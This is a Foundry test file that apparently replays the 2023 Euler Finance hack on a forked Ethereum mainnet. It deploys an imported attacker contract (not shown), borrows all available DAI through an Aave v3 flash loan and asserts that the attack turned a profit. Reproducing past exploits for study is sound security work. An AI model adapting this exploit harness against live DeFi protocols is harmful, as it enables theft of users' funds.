// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.8.4;

import {Test, console2} from "forge-std/Test.sol";
import {EulerHackPoC} from "../src/EulerHackPoC.sol";
import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
import {IPool} from "@aave/v3/interfaces/IPool.sol";
import {IAToken} from "@aave/v3/interfaces/IAToken.sol";
import {IPriceOracle} from "@aave/v3/interfaces/IPriceOracle.sol";
import {DataTypes} from "@aave/v3/protocol/libraries/types/DataTypes.sol";
import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";

contract EulerHackPoCTest is Test {
    // https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
    uint256 constant ATTACK_BLOCK_NUMBER = 16817996;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    // https://docs.aave.com/developers/deployed-contracts/v3-mainnet/ethereum-mainnet
    address constant POOL_ADDRESSES_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

    EulerHackPoC public attacker;
    IPool public pool;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), ATTACK_BLOCK_NUMBER - 1);
        IPoolAddressesProvider poolAddressesProvider = IPoolAddressesProvider(POOL_ADDRESSES_PROVIDER);
        pool = IPool(poolAddressesProvider.getPool());
        attacker = new EulerHackPoC(poolAddressesProvider, DAI);
    }

    function test_Attack() public {
        // Get the attacker's balance before the attack
        uint256 attackerBalanceBefore = IERC20(DAI).balanceOf(address(attacker));
        console2.log("Attacker DAI balance before:", attackerBalanceBefore/ 1e18);

        // Get reserve data
        DataTypes.ReserveData memory reserveData = pool.getReserveData(DAI);

        // Calculate how much we can borrow
        IERC20 stableDebtToken = IERC20(reserveData.stableDebtTokenAddress);
        IERC20 variableDebtToken = IERC20(reserveData.variableDebtTokenAddress);
        uint256 totalLiquidity = IERC20(reserveData.aTokenAddress).totalSupply();
        uint256 availableForBorrowing = totalLiquidity - (variableDebtToken.totalSupply() + stableDebtToken.totalSupply() + reserveData.unbacked + reserveData.accruedToTreasury);

        // Execute the attack
        console2.log("Executing attack, borrowing ", availableForBorrowing / 1e18);
        attacker.callFashLoan(DAI, availableForBorrowing);

        // Get the attacker's balance after the attack
        uint256 attackerBalanceAfter = IERC20(DAI).balanceOf(address(attacker));
        console2.log("Attacker DAI balance after", attackerBalanceAfter / 1e18);

        // Check if the attack was profitable
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
    }
}
